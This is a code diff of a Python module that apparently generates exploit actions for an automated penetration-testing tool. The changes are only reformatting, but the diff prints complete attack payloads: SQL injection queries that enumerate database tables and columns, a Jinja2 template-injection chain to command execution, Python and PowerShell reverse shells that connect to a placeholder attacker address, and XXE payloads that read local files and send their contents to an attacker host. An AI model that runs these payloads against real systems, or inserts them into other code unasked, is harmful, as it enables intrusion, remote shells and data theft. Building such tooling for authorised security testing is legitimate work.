@@ -91,6 +91,7 @@ _GENERIC_NEXT_STEPS = [
 
 # -- SQLi: DBMS-specific UNION / stacked extraction  -----------------------
 
+
 def _sqli_nulls(col_count: int, inject_col: int, expr: str) -> str:
     """Build a UNION SELECT column list with *expr* in position *inject_col*."""
     cols = ["NULL"] * max(col_count, 1)
@@ -138,8 +139,7 @@ _SQLI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
             "tool": "http_request",
             "description": "Enumerate PostgreSQL tables",
             "payload": (
-                "UNION SELECT {nulls_with_expr} FROM information_schema.tables "
-                "WHERE table_schema='public'-- -"
+                "UNION SELECT {nulls_with_expr} FROM information_schema.tables WHERE table_schema='public'-- -"
             ),
             "expr": "string_agg(table_name,',')",
         },
@@ -148,8 +148,7 @@ _SQLI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
             "tool": "http_request",
             "description": "Extract columns for a table",
             "payload": (
-                "UNION SELECT {nulls_with_expr} FROM information_schema.columns "
-                "WHERE table_name='{table}'-- -"
+                "UNION SELECT {nulls_with_expr} FROM information_schema.columns WHERE table_name='{table}'-- -"
             ),
             "expr": "string_agg(column_name,',')",
         },
@@ -225,8 +224,7 @@ _SSTI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
             "tool": "http_request",
             "description": "Jinja2 SSTI → RCE via __subclasses__",
             "payload": (
-                "{{''.__class__.__mro__[1].__subclasses__()[408]"
-                "('id',shell=True,stdout=-1).communicate()[0]}}"
+                "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0]}}"
             ),
         },
         {
@@ -310,9 +308,9 @@ _CMDI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
             "description": "Python reverse shell",
             "payload": (
                 ";python3 -c 'import socket,subprocess,os;"
-                "s=socket.socket();s.connect((\"{attacker_ip}\",{port}));"
+                's=socket.socket();s.connect(("{attacker_ip}",{port}));'
                 "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-                "subprocess.call([\"/bin/sh\",\"-i\"])'"
+                'subprocess.call(["/bin/sh","-i"])\''
             ),
         },
         {
@@ -328,9 +326,9 @@ _CMDI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
             "tool": "run_command",
             "description": "PowerShell reverse shell",
             "payload": (
-                '& powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'{attacker_ip}\',{port});'
+                "& powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{port});"
                 "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
-                'while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);'
+                "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                 "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                 "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
                 '"'
@@ -354,18 +352,14 @@ _XXE_EXPLOIT: list[dict[str, Any]] = [
             "%dtd;%send;"
             "]><foo>&xxe;</foo>"
         ),
-        "dtd_content": (
-            '<!ENTITY % send SYSTEM "http://{attacker_ip}:{port}/collect?data=%xxe;">'
-        ),
+        "dtd_content": ('<!ENTITY % send SYSTEM "http://{attacker_ip}:{port}/collect?data=%xxe;">'),
     },
     {
         "action": "read_file",
         "tool": "http_request",
         "description": "Read /etc/hostname via XXE direct entity",
         "payload": (
-            '<?xml version="1.0"?><!DOCTYPE foo ['
-            '<!ENTITY xxe SYSTEM "file:///etc/hostname">'
-            "]><foo>&xxe;</foo>"
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
         ),
     },
     {
@@ -504,6 +498,7 @@ _AUTH_EXPLOIT: dict[str, list[dict[str, Any]]] = {
 # Exploit action builder
 # ---------------------------------------------------------------------------
 
+
 def _build_exploit_actions(target: str, vulns: list[dict[str, Any]]) -> list[dict[str, Any]]:
     """Generate structured exploit actions from confirmed vulnerabilities.
 
@@ -544,16 +539,18 @@ def _build_exploit_actions(target: str, vulns: list[dict[str, Any]]) -> list[dic
                     actions.append(action)
             else:
                 # Blind / error-based — suggest stacked or conditional payloads
-                actions.append({
-                    "action": "blind_extract",
-                    "tool": "http_request",
-                    "description": f"Blind {dbms} SQLi — use conditional responses to extract data",
-                    "dbms": dbms,
-                    "technique": technique,
-                    "param": param,
-                    "payload": v.get("payload", ""),
-                    "hint": "Use binary search with SUBSTRING/ASCII for efficient blind extraction",
-                })
+                actions.append(
+                    {
+                        "action": "blind_extract",
+                        "tool": "http_request",
+                        "description": f"Blind {dbms} SQLi — use conditional responses to extract data",
+                        "dbms": dbms,
+                        "technique": technique,
+                        "param": param,
+                        "payload": v.get("payload", ""),
+                        "hint": "Use binary search with SUBSTRING/ASCII for efficient blind extraction",
+                    }
+                )
 
         elif vtype == "ssti":
             engine = str(v.get("engine", "")).lower()
@@ -575,15 +572,17 @@ def _build_exploit_actions(target: str, vulns: list[dict[str, Any]]) -> list[dic
             platform = "windows" if "win" in platform else "unix"
             templates = _CMDI_EXPLOIT.get(platform, _CMDI_EXPLOIT["unix"])
             for tmpl in templates:
-                actions.append({
-                    "action": tmpl["action"],
-                    "tool": tmpl["tool"],
-                    "description": tmpl["description"],
-                    "platform": platform,
-                    "payload": tmpl["payload"],
-                    "param": v.get("param", ""),
-                    "note": "Replace {attacker_ip} and {port} with your listener address",
-                })
+                actions.append(
+                    {
+                        "action": tmpl["action"],
+                        "tool": tmpl["tool"],
+                        "description": tmpl["description"],
+                        "platform": platform,
+                        "payload": tmpl["payload"],
+                        "param": v.get("param", ""),
+                        "note": "Replace {attacker_ip} and {port} with your listener address",
+                    }
+                )
 
         elif vtype == "xxe":
             for tmpl in _XXE_EXPLOIT:
@@ -617,13 +616,15 @@ def _build_exploit_actions(target: str, vulns: list[dict[str, Any]]) -> list[dic
                     actions.append(action)
             if "win" in platform:
                 for tmpl in _LFI_EXPLOIT.get("windows", []):
-                    actions.append({
-                        "action": tmpl["action"],
-                        "tool": tmpl["tool"],
-                        "description": tmpl["description"],
-                        "payload": tmpl["payload"],
-                        "param": v.get("param", ""),
-                    })
+                    actions.append(
+                        {
+                            "action": tmpl["action"],
+                            "tool": tmpl["tool"],
+                            "description": tmpl["description"],
+                            "payload": tmpl["payload"],
+                            "param": v.get("param", ""),
+                        }
+                    )
 
         elif vtype in _AUTH_EXPLOIT:
             forged = v.get("forged_token", "")
